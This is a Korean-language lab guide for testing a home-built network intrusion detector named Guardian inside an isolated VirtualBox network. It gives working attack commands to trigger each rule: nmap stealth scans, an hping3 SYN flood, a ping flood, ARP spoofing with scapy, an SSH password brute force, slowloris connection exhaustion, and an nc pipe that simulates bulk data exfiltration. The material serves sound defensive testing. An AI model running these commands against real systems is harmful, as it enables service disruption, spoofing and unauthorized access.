# 공격 테스트 가이드 (Guardian 탐지 확인용)

공격자 VM(`192.168.56.20`)에서 보안 서버(`192.168.56.10`)로만 실행합니다. 둘 다 VirtualBox 내부 네트워크 `lab` 안의 자기 소유 VM이고,
인터넷과는 끊어져 있습니다. 여기 적힌 명령은 이 실습 네트워크 밖에서는 쓰지 마세요.

## 준비

1. 보안 서버에서 `sudo python3 guardian.py` 와 `python3 dashboard/server.py` 가 둘 다 실행 중인지 확인
2. Windows 10 브라우저로 대시보드(`http://192.168.57.10:8080`) 를 열어 두고, "🚨 실시간 공격 탐지 로그" 를 보면서 테스트
3. "관제 서버 상태" 슬라이드가 **탐지만 (dry-run)** 인지 확인 (처음엔 이 상태로 전부 확인하고, 마지막에 "실제 차단" 으로 한 번 더 확인)
4. 같은 공격을 30초 안에 다시 하면 같은 알림은 또 뜨지 않습니다 (쿨다운). 결과가 안 보이면 30초 기다렸다가 다시 시도하세요
5. 규칙이 꺼져 있으면 당연히 안 뜹니다 — 대시보드 "🧪 탐지 규칙" 표에서 해당 규칙이 "켜짐"인지 먼저 확인

## 1. 포트 스캔 (`port_scan`)

10초 동안 서로 다른 포트 20개 이상에 접속하면 탐지됩니다.

```bash
nmap -p 1-100 192.168.56.10
```

**예상 결과**: 대시보드에 `port_scan` / Medium / "10초 동안 서로 다른 포트 20개에 접속 시도" 가 뜸

## 2. SYN 플러드 (`syn_flood`)

5초 동안 SYN 패킷 200개 이상.

```bash
sudo hping3 -S -p 80 --flood 192.168.56.10
```

없으면 `sudo apt install hping3`. 몇 초 돌리다가 **Ctrl+C** 로 멈추세요 (계속 두면 다른 테스트가 밀려요).

**예상 결과**: `syn_flood` / Critical

## 3. 핑 플러드 (`icmp_flood`)

5초 동안 ping 50개 이상.

```bash
sudo ping -f -c 200 192.168.56.10
```

**예상 결과**: `icmp_flood` / Medium

## 4. SSH 무차별 대입 (`ssh_bruteforce`)

보안 서버에 SSH가 켜져 있어야 합니다 (`sudo systemctl start ssh`). 60초 동안 접속 시도 10회 이상.

```bash
for i in $(seq 1 12); do nc -z -w1 192.168.56.10 22; done
```

**주의**: 칼리 기본 셸은 **zsh**라 `/dev/tcp` 같은 bash 전용 문법은 안 됩니다. `nc` 를 쓰세요.

**예상 결과**: `ssh_bruteforce` / Critical

## 5. 텔넷 접속 시도 (`telnet_probe`, 예제 사용자 규칙)

**기본값이 꺼져 있습니다.** 대시보드 "🧪 탐지 규칙" 표에서 먼저 **켜기**를 눌러야 합니다. 서버에 실제 텔넷이 없어도 됩니다 — 이 규칙은 23번
포트로 들어오는 **연결 시도(SYN)만** 세고, 뭔가 응답하는지는 보지 않습니다. 30초 동안 5회 이상.

```bash
for i in $(seq 1 6); do nc -z -w1 192.168.56.10 23; done
```

**예상 결과**: `telnet_probe` / Medium

## 6. ARP 스푸핑 (`arp_spoof`) — 선택

같은 IP의 MAC 주소가 바뀌면 탐지됩니다. Guardian 은 "처음 본 IP-MAC 조합"을 정상으로 기억하므로, 같은 IP 를 **서로 다른 MAC** 으로 두 번 알려야 합니다.
`arpspoof` 는 항상 공격자 자신의 MAC 만 보내서 두 번 돌려도 MAC 이 같아 잡히지 않습니다. 칼리에 기본으로 있는 scapy 로 직접 보냅니다 (인터넷 불필요):

```bash
sudo python3 -c "from scapy.all import *; [sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, psrc='192.168.56.99', hwsrc=m, pdst='192.168.56.10'), iface='eth0', verbose=0) for m in ('02:00:00:00:00:01', '02:00:00:00:00:02')]"
```

`192.168.56.99` 는 없는 장비여도 됩니다. 첫 번째 MAC 이 "정상"으로 기록되고, 두 번째 MAC 에서 바뀐 것으로 잡힙니다.
진짜 중간자 공격처럼 보이고 싶으면 `sudo arpspoof -i eth0 -t 192.168.56.10 192.168.56.1` 도 있지만, 그 IP 의 원래 MAC 을 Guardian 이 먼저 알고 있어야 탐지됩니다.

**예상 결과**: `arp_spoof` / Critical

## 7. 대량 데이터 유출 (`exfiltration`) — 선택, 서버 쪽에서 실행

다른 테스트와 달리 이건 **공격자가 아니라 보안 서버 자신**이 60초 안에 50MB 이상을 내보낼 때 뜹니다 (알림만, 차단 없음). 보안 서버에서
실행하세요. 받는 쪽은 공격자입니다.

공격자 (받는 쪽, 먼저 실행):
```bash
nc -l -p 9000 > /dev/null
```

보안 서버 (보내는 쪽):
```bash
dd if=/dev/zero bs=1M count=60 | nc -w2 192.168.56.20 9000
```

**예상 결과**: `exfiltration` / Medium / 알림만 (차단 목록에는 안 올라감 — 이유는 `dashboard/README.md` 참고)

## 8. SSH 로그인 성공 (`ssh_login_success`) — 공격자 VM 에서
일부러 비밀번호를 5번 이상 틀린 뒤 맞게 로그인합니다 (`-o PreferredAuthentications=password` 로 키 로그인을 끕니다).

```bash
for i in 1 2 3 4 5 6; do sshpass -p 'wrong' ssh -o StrictHostKeyChecking=no -o PreferredAuthentications=password -o PubkeyAuthentication=no kali@192.168.56.10 true; done
ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no kali@192.168.56.10 true
```
마지막 줄에서 진짜 비밀번호를 직접 입력하세요. `sshpass` 가 없으면 첫 줄 대신 `ssh` 로 틀린 비밀번호를 6번 입력해도 됩니다.
**확인:** "SSH 로그인 성공 (공격 뒤)" 이 Critical 로 뜹니다. 탐지 로그의 주소를 누르면 흐름이 나옵니다.

## 9. 잘 안 보이는 스캔 (`port_scan`) — 공격자 VM 에서
```bash
sudo nmap -sN -p 1-100 192.168.56.10
sudo nmap -sF -p 1-100 192.168.56.10
sudo nmap -sX -p 1-100 192.168.56.10
sudo nmap -sU -p 1-100 --max-retries 0 192.168.56.10
```
**확인:** 상세에 "비정상 플래그(NULL·FIN·Xmas) 패킷" 또는 "UDP 패킷" 으로 표시됩니다. 같은 IP 는 30초에 한 번만 기록되니 명령 사이에 30초 기다리세요.

## 10. 서버의 다른 IP 로 들어오기 (`port_scan`) — 공격자 VM 에서
서버의 관리망 주소(192.168.57.10)를 감시망 쪽으로 찌르는 시험입니다.
```bash
sudo ip route add 192.168.57.0/24 via 192.168.56.10
nmap -p 1-100 192.168.57.10
sudo ip route del 192.168.57.0/24
```
**확인:** 포트 스캔이 탐지됩니다. 포트가 열려 있다고 나오면 관리망 주소가 감시망에서도 닿는다는 뜻입니다 (대시보드 8080 포함). 토큰으로 보호되지만 망이 분리된 것은 아닙니다.

## 11. 슬로로리스 연결 고갈 (`slowloris`, 플러그인 방식 규칙)
규칙 파일은 공유 폴더 `guardian/examples/slowloris_rule/` (`rule.json`, `slowloris_check.py`) 에 있습니다. 대시보드 "🧪 탐지 규칙 → 📤 플러그인 방식 규칙 올리기"로 두 파일을 올리고, 서버 터미널에서 `python3 ~/guardian/dashboard/approve_plugin.py approve slowloris` 로 승인한 뒤 화면에서 켭니다.

서버 (시험용 웹 서버, 5분 뒤 저절로 꺼짐):
```bash
mkdir -p /tmp/web && cd /tmp/web && echo hello > index.html && timeout 300 python3 -m http.server 8081 --bind 192.168.56.10
```
공격자 (연결 30개를 열고 10초마다 헤더 한 줄씩 보내며 1분간 붙잡음):
```bash
for i in $(seq 1 30); do ( printf 'GET / HTTP/1.1\r\nHost: test\r\n'; for k in 1 2 3 4 5 6; do sleep 10; printf 'X-a: b\r\n'; done ) | nc 192.168.56.10 8081 > /dev/null & done
```
**예상 결과:** 10초 안에 `slowloris` / Critical, "연결 30개를 동시에 붙잡고 있음 (8081번 30개, 기준 20개)". 패킷 수가 적어서 포트 스캔·플러드 규칙에는 걸리지 않습니다. 실제 차단이면 차단되는 순간 공격자의 연결이 모두 멈춥니다.

## 정리

- 테스트가 끝나면 "현재 차단 목록"에서 테스트용 차단을 **해제**하거나 시간이 지나 자동으로 풀리게 두세요
- "실제 차단" 으로 한 번 더 확인했다면, 스냅샷을 찍기 전에 슬라이드를 **탐지만 (dry-run)** 으로 다시 꺼 두세요
- 규칙을 테스트하며 꺼둔 게 있으면 시연 전에 다시 켜 두세요 (대시보드 "📝 규칙 변경 기록" 에서 뭘 건드렸는지 확인 가능)
